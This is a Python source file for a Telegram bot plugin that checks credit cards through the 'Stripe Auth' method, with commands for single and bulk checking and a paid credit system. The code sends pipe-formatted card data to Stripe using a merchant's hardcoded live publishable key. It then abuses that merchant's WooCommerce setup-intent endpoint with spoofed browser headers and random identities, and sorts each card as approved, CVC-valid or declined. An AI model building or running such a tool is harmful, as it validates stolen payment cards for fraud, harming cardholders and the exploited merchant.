import re
import json
import requests
import asyncio
from time import time
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.enums import ChatType
import random
import string

# Stripe Auth API Config
STRIPE_API_URL = "https://api.stripe.com/v1/payment_methods"
STRIPE_PK = "pk_live_51KDcNrImW2Hlp9sc4dxVEesSbWiCa3eqc1g7JIVFf0oa2tePZ7KAkaPSe3tgV0NrHnAgHDGZxZtGqDXRCbFqz0n000pyW5QR3A"

user_locks = {}

def load_users():
    try:
        with open("DATA/users.json", "r") as f:
            return json.load(f)
    except:
        return {}

def load_allowed_groups():
    try:
        with open("DATA/groups.json", "r") as f:
            return json.load(f)
    except:
        return []

def has_credits(user_id):
    try:
        with open("DATA/users.json", "r") as f:
            users = json.load(f)
        user = users.get(str(user_id))
        if not user:
            return False
        credits = user.get("plan", {}).get("credits", 0)
        if credits == "∞":
            return True
        return int(credits) > 0
    except:
        return False

def deduct_credit(user_id):
    try:
        with open("DATA/users.json", "r") as f:
            users = json.load(f)
        user = users.get(str(user_id))
        if not user:
            return False
        credits = user["plan"].get("credits", 0)
        if credits == "∞":
            return True
        if int(credits) > 0:
            user["plan"]["credits"] = str(int(credits) - 1)
            users[str(user_id)] = user
            with open("DATA/users.json", "w") as f:
                json.dump(users, f, indent=4)
            return True
        return False
    except:
        return False

def deduct_credit_bulk(user_id, amount):
    try:
        with open("DATA/users.json", "r") as f:
            users = json.load(f)
        user = users.get(str(user_id))
        if not user:
            return False
        credits = user["plan"].get("credits", 0)
        if credits == "∞":
            return True
        credits = int(credits)
        if credits >= amount:
            user["plan"]["credits"] = str(credits - amount)
            users[str(user_id)] = user
            with open("DATA/users.json", "w") as f:
                json.dump(users, f, indent=4)
            return True
        return False
    except:
        return False

def extract_card(text):
    match = re.search(r'(\d{12,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})', text)
    if match:
        return match.groups()
    return None

def extract_cards(text):
    return re.findall(r'(\d{12,19}\|\d{1,2}\|\d{2,4}\|\d{3,4})', text)

def chunk_cards(cards, size):
    for i in range(0, len(cards), size):
        yield cards[i:i + size]

def generate_random_string(length=6):
    return ''.join(random.choices(string.hexdigits.lower(), k=length))

def generate_guid():
    import uuid
    return str(uuid.uuid4()) + generate_random_string()

def generate_email():
    random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"{random_str}@gmail.com"

def get_status_and_response(response_data):
    """Determine status and clean response from API result"""
    try:
        if isinstance(response_data, dict):
            # Check for error
            if "error" in response_data:
                error = response_data["error"]
                code = error.get("code", "")
                decline_code = error.get("decline_code", "")
                message = error.get("message", "Error")
                
                code_upper = (code + " " + decline_code).upper()
                
                if any(kw in code_upper for kw in ["INSUFFICIENT_FUNDS", "INSUFFICIENT FUNDS"]):
                    return "Approved ✅", "Insufficient Funds"
                elif any(kw in code_upper for kw in ["INCORRECT_CVC", "INVALID_CVC", "CVC"]):
                    return "CCN ✅", "CVC Error"
                elif any(kw in code_upper for kw in ["EXPIRED", "EXPIRED_CARD"]):
                    return "Declined ❌", "Card Expired"
                elif any(kw in code_upper for kw in ["STOLEN", "LOST", "PICKUP"]):
                    return "Declined ❌", "Lost/Stolen Card"
                elif any(kw in code_upper for kw in ["DO_NOT_HONOR", "GENERIC_DECLINE", "CARD_DECLINED"]):
                    return "Declined ❌", decline_code.replace("_", " ").title() if decline_code else "Card Declined"
                elif any(kw in code_upper for kw in ["INVALID", "INCORRECT_NUMBER"]):
                    return "Declined ❌", "Invalid Card"
                elif any(kw in code_upper for kw in ["FRAUDULENT", "FRAUD"]):
                    return "Declined ❌", "Fraud Detected"
                elif any(kw in code_upper for kw in ["AUTHENTICATION", "3D_SECURE", "REQUIRES_ACTION"]):
                    return "Charged 💎", "3D Secure Required"
                else:
                    return "Declined ❌", decline_code.replace("_", " ").title() if decline_code else code.replace("_", " ").title()
            
            # Check for success (payment method created)
            elif "id" in response_data and response_data.get("id", "").startswith("pm_"):
                return "processing", response_data["id"]
            
            # Setup intent response
            elif "success" in response_data:
                if response_data.get("success") == True:
                    return "Charged 💎", "Setup Intent Success"
                else:
                    return "Declined ❌", response_data.get("message", "Failed")
            
            elif "message" in response_data:
                msg = response_data["message"].lower()
                if "success" in msg:
                    return "Charged 💎", "Success"
                else:
                    return "Declined ❌", response_data["message"][:50]
        
        return "Declined ❌", str(response_data)[:50]
    except Exception as e:
        return "Declined ❌", str(e)[:50]

def create_payment_method_sync(cc, mm, yy, cvv):
    """Create payment method with Stripe API"""
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-AU,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    # Format year
    if len(yy) == 4:
        exp_year = yy[2:]
    else:
        exp_year = yy
    
    guid = generate_guid()
    muid = generate_guid()
    sid = generate_guid()
    email = generate_email()
    
    data = {
        'type': 'card',
        'billing_details[name]': 'John Doe',
        'billing_details[email]': email,
        'card[number]': cc,
        'card[cvc]': cvv,
        'card[exp_month]': mm,
        'card[exp_year]': exp_year,
        'guid': guid,
        'muid': muid,
        'sid': sid,
        'payment_user_agent': 'stripe.js/83a1f53796; stripe-js-v3/83a1f53796; split-card-element',
        'referrer': 'https://wayuumarket.com',
        'time_on_page': str(random.randint(10000, 30000)),
        'key': STRIPE_PK,
    }
    
    try:
        response = requests.post(STRIPE_API_URL, headers=headers, data=data, timeout=60)
        return response.json()
    except Exception as e:
        return {"error": {"message": str(e)}}

def create_setup_intent_sync(payment_method_id):
    """Create setup intent with WayuuMarket"""
    cookies = {
        'cookielawinfo-checkbox-necessary': 'yes',
        'cookielawinfo-checkbox-functional': 'yes',
        'cookielawinfo-checkbox-performance': 'yes',
        'cookielawinfo-checkbox-analytics': 'yes',
        'cookielawinfo-checkbox-advertisement': 'yes',
        'cookielawinfo-checkbox-others': 'yes',
        'viewed_cookie_policy': 'yes',
    }
    
    headers = {
        'authority': 'wayuumarket.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-AU,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://wayuumarket.com',
        'referer': 'https://wayuumarket.com/my-account/add-payment-method/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    
    params = {
        'wc-ajax': 'wc_stripe_create_setup_intent',
    }
    
    nonce = ''.join(random.choices(string.hexdigits.lower(), k=10))
    
    data = {
        'stripe_source_id': payment_method_id,
        'nonce': nonce,
    }
    
    try:
        response = requests.post('https://wayuumarket.com/', params=params, cookies=cookies, headers=headers, data=data, timeout=60)
        return response.json()
    except Exception as e:
        return {"error": {"message": str(e)}}

def check_stripe_auth(cc, mm, yy, cvv):
    """Full Stripe Auth check"""
    # Step 1: Create payment method
    pm_result = create_payment_method_sync(cc, mm, yy, cvv)
    
    status, response = get_status_and_response(pm_result)
    
    # If payment method creation failed, return error
    if status != "processing":
        return status, response
    
    # Step 2: Create setup intent
    payment_method_id = response
    setup_result = create_setup_intent_sync(payment_method_id)
    
    return get_status_and_response(setup_result)

def is_free_user(user_id):
    """Check if user has free plan"""
    try:
        users = load_users()
        user = users.get(str(user_id))
        if not user:
            return True
        plan = user.get("plan", {}).get("plan", "Free")
        return plan in ["Free", "Redeem Code"]
    except:
        return True

@Client.on_message(filters.command("au") & ~filters.edited)
async def stripe_auth_single(client, message):
    """Single card Stripe Auth checker"""
    try:
        allowed_groups = load_allowed_groups()
        user_id = str(message.from_user.id)
        
        # Check if in private chat
        if message.chat.type == ChatType.PRIVATE:
            if is_free_user(user_id):
                return await message.reply(
                    "<pre>Notification ❗️</pre>\n"
                    "<b>~ Message :</b> <code>Free users can only check in groups!</code>\n"
                    "<b>~ Get Premium to use in private</b>\n"
                    "━━━━━━━━━━━━━\n"
                    "<b>Type <code>/buy</code> to get Premium.</b>",
                    reply_to_message_id=message.id
                )
        elif message.chat.type in [ChatType.GROUP, ChatType.SUPERGROUP]:
            if message.chat.id not in allowed_groups:
                return await message.reply(
                    "<pre>Notification ❗️</pre>\n"
                    "<b>~ Message :</b> <code>This Group Is Not Approved ⚠️</code>",
                )
        
        users = load_users()
        
        if user_id not in users:
            return await message.reply(
                "<pre>Access Denied 🚫</pre>\n<b>Register first using</b> <code>/register</code>",
                reply_to_message_id=message.id
            )
        
        if not has_credits(user_id):
            return await message.reply(
                "<pre>Insufficient Credits ❗️</pre>\n<b>Type /buy to get Credits.</b>",
                reply_to_message_id=message.id
            )
        
        target_text = None
        if message.reply_to_message and message.reply_to_message.text:
            target_text = message.reply_to_message.text
        elif len(message.text.split(maxsplit=1)) > 1:
            target_text = message.text.split(maxsplit=1)[1]
        
        if not target_text:
            return await message.reply(
                "<pre>CC Not Found ❌</pre>\n<b>Usage:</b> <code>/au cc|mm|yy|cvv</code>",
                reply_to_message_id=message.id
            )
        
        extracted = extract_card(target_text)
        if not extracted:
            return await message.reply(
                "<pre>Invalid Format ❌</pre>\n<b>Usage:</b> <code>/au cc|mm|yy|cvv</code>",
                reply_to_message_id=message.id
            )
        
        cc, mm, yy, cvv = extracted
        fullcc = f"{cc}|{mm}|{yy}|{cvv}"
        
        start_time = time()
        
        loading_msg = await message.reply(
            f"<pre>Processing..!</pre>\n━━━━━━━━━━━━\n• <b>Card -</b> <code>{fullcc}</code>\n• <b>Gate -</b> <code>Stripe Auth</code>",
            reply_to_message_id=message.id
        )
        
        # Run in executor to avoid blocking
        loop = asyncio.get_event_loop()
        status, response = await loop.run_in_executor(None, check_stripe_auth, cc, mm, yy, cvv)
        
        end_time = time()
        timetaken = round(end_time - start_time, 2)
        
        profile = f"<a href='tg://user?id={user_id}'>{message.from_user.first_name}</a>"
        
        user_data = users.get(user_id, {})
        plan = user_data.get("plan", {}).get("plan", "Free")
        badge = user_data.get("plan", {}).get("badge", "🎟️")
        
        final_msg = f"""<b>[#StripeAuth] | Sos</b> ✦
━━━━━━━━━━━━━━━
<b>[•] Card</b>- <code>{fullcc}</code>
<b>[•] Gateway</b> - <b>Stripe Auth</b>
<b>[•] Status</b>- <code>{status}</code>
<b>[•] Response</b>- <code>{response}</code>
━━━━━━━━━━━━━━━
<b>[ﾒ] Checked By</b>: {profile} [<code>{plan} {badge}</code>]
<b>[ﾒ] T/t</b>: <code>[{timetaken} 𝐬]</code>"""
        
        buttons = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("Support", url="https://t.me/SoskeUI"),
            ]
        ])
        
        await loading_msg.edit(final_msg, reply_markup=buttons, disable_web_page_preview=True)
        
        deduct_credit(user_id)
    
    except Exception as e:
        await message.reply(f"<code>Error: {str(e)[:50]}</code>", reply_to_message_id=message.id)


@Client.on_message(filters.command("mau") & ~filters.edited)
async def stripe_auth_mass(client, message):
    """Mass Stripe Auth checker"""
    user_id = str(message.from_user.id)
    
    if not message.from_user:
        return await message.reply("❌ Cannot process this message.")
    
    if user_id in user_locks:
        return await message.reply(
            "<pre>⚠️ Wait!</pre>\n<b>Your previous /mau is still processing.</b>",
            reply_to_message_id=message.id
        )
    
    user_locks[user_id] = True
    
    try:
        users = load_users()
        allowed_groups = load_allowed_groups()
        
        # Check if in private chat
        if message.chat.type == ChatType.PRIVATE:
            if is_free_user(user_id):
                user_locks.pop(user_id, None)
                return await message.reply(
                    "<pre>Notification ❗️</pre>\n"
                    "<b>~ Message :</b> <code>Free users can only check in groups!</code>\n"
                    "<b>~ Get Premium to use in private</b>\n"
                    "━━━━━━━━━━━━━\n"
                    "<b>Type <code>/buy</code> to get Premium.</b>",
                    reply_to_message_id=message.id
                )
        elif message.chat.type in [ChatType.GROUP, ChatType.SUPERGROUP]:
            if message.chat.id not in allowed_groups:
                user_locks.pop(user_id, None)
                return await message.reply(
                    "<pre>Notification ❗️</pre>\n<b>This Group Is Not Approved ⚠️</b>",
                    reply_to_message_id=message.id
                )
        
        if user_id not in users:
            user_locks.pop(user_id, None)
            return await message.reply(
                "<pre>Access Denied 🚫</pre>\n<b>Register first using</b> <code>/register</code>",
                reply_to_message_id=message.id
            )
        
        user_data = users[user_id]
        plan_info = user_data.get("plan", {})
        mlimit = plan_info.get("mlimit", 10)
        plan = plan_info.get("plan", "Free")
        badge = plan_info.get("badge", "🎟️")
        
        if mlimit is None or str(mlimit).lower() in ["null", "none"]:
            mlimit = 10000
        else:
            mlimit = int(mlimit)
        
        target_text = None
        if message.reply_to_message and message.reply_to_message.text:
            target_text = message.reply_to_message.text
        elif len(message.text.split(maxsplit=1)) > 1:
            target_text = message.text.split(maxsplit=1)[1]
        
        if not target_text:
            user_locks.pop(user_id, None)
            return await message.reply(
                "❌ Send cards!\nFormat: <code>4111111111111111|12|25|123</code>",
                reply_to_message_id=message.id
            )
        
        all_cards = extract_cards(target_text)
        if not all_cards:
            user_locks.pop(user_id, None)
            return await message.reply("❌ No valid cards found!", reply_to_message_id=message.id)
        
        if len(all_cards) > mlimit:
            user_locks.pop(user_id, None)
            return await message.reply(
                f"❌ Max {mlimit} cards allowed for your plan!",
                reply_to_message_id=message.id
            )
        
        available_credits = user_data.get("plan", {}).get("credits", 0)
        card_count = len(all_cards)
        
        if available_credits != "∞":
            try:
                if card_count > int(available_credits):
                    user_locks.pop(user_id, None)
                    return await message.reply(
                        "<pre>Insufficient Credits ❗️</pre>\n<b>Type /buy to get Credits.</b>",
                        reply_to_message_id=message.id
                    )
            except:
                pass
        
        checked_by = f"<a href='tg://user?id={user_id}'>{message.from_user.first_name}</a>"
        
        loader_msg = await message.reply(
            f"<pre>✦ [$mau] | M-Stripe Auth</pre>\n"
            f"<b>[⚬] Gateway:</b> <b>Stripe Auth</b>\n"
            f"<b>[⚬] Cards:</b> <code>{card_count}</code>\n"
            f"<b>[⚬] Status:</b> <code>Processing...</code>",
            reply_to_message_id=message.id
        )
        
        start_time = time()
        final_results = []
        loop = asyncio.get_event_loop()
        
        for card in all_cards:
            parts = card.split("|")
            if len(parts) == 4:
                cc, mm, yy, cvv = parts
                status, response = await loop.run_in_executor(None, check_stripe_auth, cc, mm, yy, cvv)
                
                final_results.append(
                    f"• <b>Card:</b> <code>{card}</code>\n"
                    f"• <b>Status:</b> <code>{status}</code>\n"
                    f"• <b>Response:</b> <code>{response}</code>\n"
                    "━━━━━━━━━━━━"
                )
                
                try:
                    await loader_msg.edit(
                        f"<pre>✦ [$mau] | M-Stripe Auth</pre>\n"
                        + "\n".join(final_results[-8:]) + "\n"
                        f"<b>[⚬] Progress:</b> <code>{len(final_results)}/{card_count}</code>\n"
                        f"<b>[⚬] Checked By:</b> {checked_by}",
                        disable_web_page_preview=True
                    )
                except:
                    pass
        
        end_time = time()
        timetaken = round(end_time - start_time, 2)
        
        if available_credits != "∞":
            deduct_credit_bulk(user_id, card_count)
        
        display_results = final_results[-10:] if len(final_results) > 10 else final_results
        
        await loader_msg.edit(
            f"<pre>✦ [$mau] | M-Stripe Auth</pre>\n"
            f"{chr(10).join(display_results)}\n"
            f"<b>[⚬] T/t:</b> <code>{timetaken}s</code>\n"
            f"<b>[⚬] Total:</b> <code>{card_count} cards</code>\n"
            f"<b>[⚬] Checked By:</b> {checked_by} [<code>{plan} {badge}</code>]",
            disable_web_page_preview=True
        )
    
    except Exception as e:
        await message.reply(f"⚠️ Error: {str(e)[:50]}", reply_to_message_id=message.id)
    
    finally:
        user_locks.pop(user_id, None)
